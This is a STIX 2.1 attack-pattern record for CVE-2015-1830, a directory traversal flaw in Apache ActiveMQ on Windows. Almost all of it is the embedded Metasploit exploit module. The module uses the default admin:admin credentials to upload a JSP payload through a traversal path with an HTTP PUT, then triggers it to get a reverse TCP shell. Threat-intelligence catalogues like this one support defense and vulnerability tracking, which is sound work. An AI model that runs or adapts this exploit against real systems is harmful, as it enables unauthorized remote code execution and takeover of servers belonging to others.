{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aa50fd07-9730-411f-b49a-a88d09a21716",
    "created": "2024-08-14T16:52:11.319967Z",
    "modified": "2024-08-14T16:52:11.319971Z",
    "name": "Apache ActiveMQ 5.x-5.11.1 Directory Traversal Shell Upload",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/apache_activemq_traversal_upload.rb",
            "external_id": "apache_activemq_traversal_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-1830"
        },
        {
            "source_name": "reference",
            "url": "https://activemq.apache.org/security-advisories.data/CVE-2015-1830-announcement.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache ActiveMQ 5.x-5.11.1 Directory Traversal Shell Upload',\n        'Description' => %q{\n          This module exploits a directory traversal vulnerability (CVE-2015-1830) in Apache\n          ActiveMQ 5.x before 5.11.2 for Windows.\n\n          The module tries to upload a JSP payload to the /admin directory via the traversal\n          path /fileserver/..\\admin\\ using an HTTP PUT request with the default ActiveMQ\n          credentials admin:admin (or other credentials provided by the user). It then issues\n          an HTTP GET request to /admin/<payload>.jsp on the target in order to trigger the\n          payload and obtain a shell.\n        },\n        'Author' => [\n          'David Jorm', # Discovery and exploit\n          'Erik Wynter' # @wyntererik - Metasploit\n        ],\n        'References' => [\n          [ 'CVE', '2015-1830' ],\n          [ 'EDB', '40857'],\n          [ 'URL', 'https://activemq.apache.org/security-advisories.data/CVE-2015-1830-announcement.txt' ]\n        ],\n        'Privileged' => false,\n        'Platform' => %w[win],\n        'Targets' => [\n          [\n            'Windows Java',\n            {\n              'Arch' => ARCH_JAVA,\n              'Platform' => 'win'\n            }\n          ],\n        ],\n        'DisclosureDate' => '2015-08-19',\n        'License' => MSF_LICENSE,\n        'DefaultOptions' => {\n          'RPORT' => 8161,\n          'PAYLOAD' => 'java/jsp_shell_reverse_tcp'\n        },\n        'DefaultTarget' => 0\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'The base path to the web application', '/']),\n      OptString.new('PATH', [true, 'Traversal path', '/fileserver/..\\\\admin\\\\']),\n      OptString.new('USERNAME', [true, 'Username to authenticate with', 'admin']),\n      OptString.new('PASSWORD', [true, 'Password to authenticate with', 'admin'])\n    ])\n  end\n\n  def check\n    print_status('Running check...')\n    testfile = Rex::Text.rand_text_alpha(10)\n    testcontent = Rex::Text.rand_text_alpha(10)\n\n    send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, datastore['PATH'], \"#{testfile}.jsp\"),\n      'headers' => {\n        'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])\n      },\n      'method' => 'PUT',\n      'data' => \"<% out.println(\\\"#{testcontent}\\\");%>\"\n    })\n\n    res1 = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, \"admin/#{testfile}.jsp\"),\n      'headers' => {\n        'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])\n      },\n      'method' => 'GET'\n    })\n\n    if res1 && res1.body.include?(testcontent)\n      send_request_cgi(\n        {\n          'uri' => normalize_uri(target_uri.path, \"admin/#{testfile}.jsp\"),\n          'headers' => {\n            'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])\n          },\n          'method' => 'DELETE'\n        },\n        1\n      )\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    print_status('Uploading payload...')\n    testfile = Rex::Text.rand_text_alpha(10)\n    vprint_status(\"If upload succeeds, payload will be available at #{target_uri.path}admin/#{testfile}.jsp\") # This information is provided to allow for manual execution of the payload in case the upload is successful but the GET request issued by the module fails.\n\n    send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, datastore['PATH'], \"#{testfile}.jsp\"),\n      'headers' => {\n        'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])\n      },\n      'method' => 'PUT',\n      'data' => payload.encoded\n    })\n\n    print_status('Payload sent. Attempting to execute the payload.')\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, \"admin/#{testfile}.jsp\"),\n      'headers' => {\n        'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])\n      },\n      'method' => 'GET'\n    })\n    if res && res.code == 200\n      print_good('Payload executed!')\n    else\n      fail_with(Failure::PayloadFailed, 'Failed to execute the payload')\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2015-08-19",
    "x_mitre_platforms": [
        "win"
    ]
}